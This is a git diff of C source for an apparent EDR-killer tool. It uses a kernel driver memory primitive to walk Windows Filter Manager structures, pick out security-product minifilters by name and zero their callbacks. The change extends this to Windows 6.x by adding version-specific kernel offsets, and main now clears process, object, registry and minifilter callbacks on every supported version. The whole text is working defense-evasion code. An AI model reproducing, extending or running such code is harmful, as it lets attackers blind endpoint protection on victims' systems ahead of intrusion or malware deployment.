@@ -661,16 +661,28 @@ VOID AddEDRIntance(INT64 IntanceAddr) {
 	EDRIntance[i] = IntanceAddr;
 }
 CHAR* ReadDriverName(INT64 FLT_FILTERAddr) {
+	
+	INT Offset = 0;
+	if (dwMajor == 10) {
+		Offset = 0x38;
+	}
+	else if (dwMajor == 6) {
+		Offset = 0x28;
+	}
+	else {
+		printf("Windows system version not supported yet.");
+		exit(0);
+	}
 	USHORT FilerNameLen = 0;
-	DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0x3A), &FilerNameLen, 2);
-
+	DriverWriteMemery((VOID*)(FLT_FILTERAddr + Offset + 2), &FilerNameLen, 2);
 	if (FilerNameLen == 0) return NULL;
-	INT64 FilterNameAddr = 0;
-	DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0x40), &FilterNameAddr, 8);
 
-	TCHAR* FilterName = (TCHAR*)calloc(FilerNameLen, 1);
+	INT64 FilterNameAddr = 0;
+	DriverWriteMemery((VOID*)(FLT_FILTERAddr + Offset + 8), &FilterNameAddr, 8);
+
+	TCHAR* FilterName = (TCHAR*)calloc(FilerNameLen+50, 1);
 	if (FilterName == NULL) return NULL;
-	DriverWriteMemery((VOID*)(FilterNameAddr), FilterName, FilerNameLen);
+	DriverWriteMemery((VOID*)FilterNameAddr, FilterName, FilerNameLen);
 
 	CHAR* FilterNameA = (CHAR*)calloc(FilerNameLen + 10, 1);
 	if (FilterNameA == 0) return NULL;
@@ -691,7 +703,18 @@ BOOL IsEDRIntance(INT j, INT64 Flink) {
 		k++;
 	}
 	if (!Flag) return Flag;
-	InstanceAddr += 0x40;
+
+	if (dwMajor == 10) {
+		InstanceAddr += 0x40;
+	}
+	else if (dwMajor == 6) {
+		InstanceAddr += 0x30;
+	}
+	else {
+		printf("Windows system version not supported yet.");
+		exit(0);
+	}
+	
 	INT64 FilterAddr = 0;
 	DriverWriteMemery((VOID*)InstanceAddr, &FilterAddr, 8);
 
@@ -704,8 +727,17 @@ BOOL IsEDRIntance(INT j, INT64 Flink) {
 }
 VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
 	INT64 FilterInstanceAddr = 0;
-	DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0xD0), &FilterInstanceAddr, 8); //0x68 + 0x68
 
+	if (dwMajor == 10) {
+		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0xD0), &FilterInstanceAddr, 8); //0x68 + 0x68
+	}
+	else if (dwMajor == 6) {
+		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0xC0), &FilterInstanceAddr, 8); //0x58+0x68
+	}
+	else {
+		printf("Windows system version not supported yet.");
+		exit(0);
+	}
 
 	INT64 FirstLink = FilterInstanceAddr;
 	INT64 data = 0;
@@ -721,7 +753,18 @@ VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
 	count--;
 	INT i = 0;
 	do {
-		FilterInstanceAddr -= 0x70;
+		INT Offset = 0;
+		if (dwMajor == 10) {
+			Offset = 0x70;
+		}
+		else if (dwMajor == 6) {
+			Offset = 0x60;
+		}
+		else {
+			printf("Windows system version not supported yet.");
+			exit(0);
+		}
+		FilterInstanceAddr -= Offset;
 		printf("\t\tFLT_INSTANCE 0x%I64x\n", FilterInstanceAddr);
 		AddEDRIntance(FilterInstanceAddr);
 
@@ -730,6 +773,7 @@ VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
 			INT offset = 0;
 			if (dwMajor == 10 && dwBuild < 22000) offset = 0xa0;
 			else if (dwMajor == 10 && dwBuild >= 22000) offset = 0xa8;
+			else if (dwMajor == 6) offset = 0x90;
 			else {
 				printf("Windows system version not supported yet.");
 				exit(0);
@@ -739,10 +783,10 @@ VOID RemoverInstanceCallback(INT64 FLT_FILTERAddr) {
 				printf("\t\t\t[%d] : 0x%I64x\t[Clear]\n", i, CallbackNodeData);
 				DriverWriteMemery(&data, (VOID*)(FilterInstanceAddr + offset + i * 8), 8);
 			}
-
 		}
+
 		INT64 tmpAddr = 0;
-		DriverWriteMemery((VOID*)(FilterInstanceAddr + 0x70), &tmpAddr, 8);
+		DriverWriteMemery((VOID*)(FilterInstanceAddr + Offset), &tmpAddr, 8);
 		FilterInstanceAddr = tmpAddr;
 		i++;
 	} while (i < count);
@@ -797,6 +841,10 @@ VOID ClearMiniFilterCallback() {
 
 	INT64 FilterFirstLink = FLT_FILTERAddr;
 
+	ULONG FilterCount = 0;
+	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0xC0), &FilterCount, 4);
+
+	INT i = 0;
 	do {
 
 		FLT_FILTERAddr -= 0x10;
@@ -804,15 +852,15 @@ VOID ClearMiniFilterCallback() {
 		CHAR* FilterName = ReadDriverName(FLT_FILTERAddr);
 		if (FilterName == NULL)break;
 		printf("\tFLT_FILTER %s: 0x%I64x\n", FilterName, FLT_FILTERAddr);
-
+		
 		if (IsEDR(FilterName)) {
 			RemoverInstanceCallback(FLT_FILTERAddr);
 		}
 		INT64 tmpaddr = 0;
 		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0x10), &tmpaddr, 8);
 		FLT_FILTERAddr = tmpaddr;
-	} while (FilterFirstLink != FLT_FILTERAddr);
-
+		i++;
+	} while (i < FilterCount);
 
 	INT64 FLT_VOLUMESAddr = 0;
 	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0x130), &FLT_VOLUMESAddr, 8);
@@ -823,7 +871,7 @@ VOID ClearMiniFilterCallback() {
 
 	//printf("FLT_VOLUMESCount %d\n", FLT_VOLUMESCount);
 
-	INT i = 0;
+	i = 0;
 	do {
 		FLT_VOLUMESAddr -= 0x10;
 
@@ -835,12 +883,14 @@ VOID ClearMiniFilterCallback() {
 		else if (dwMajor == 10 && dwBuild >= 22000) {
 			VolumesCallback = FLT_VOLUMESAddr + 0x130;
 		}
+		else if (dwMajor == 6) {
+			VolumesCallback = FLT_VOLUMESAddr + 0x110;
+		}
 		else {
 			printf("Windows system version not supported yet.");
 			return;
 		}
 		
-
 		for (INT j = 0; j < 50; j++) {
 
 			INT64 FlinkAddr = VolumesCallback + (j * 16);
@@ -881,7 +931,7 @@ VOID ClearMiniFilterCallback() {
 
 
 		}
-
+		
 		INT64 tmpaddr = 0;
 		DriverWriteMemery((VOID*)(FLT_VOLUMESAddr + 0x10), &tmpaddr, 8);
 		FLT_VOLUMESAddr = tmpaddr;
@@ -903,12 +953,7 @@ int main()
 	ClearThreeCallBack();
 	ClearObRegisterCallbacks();
 	ClearCmRegisterCallback();
-	if (dwMajor == 10) {
-		ClearMiniFilterCallback();
-	}
-	else {
-		printf("Minifilter callback clear currently only supports win10 and win11.");
-	}
+	ClearMiniFilterCallback();
 	
 	UnloadDrive();
 	system("pause");
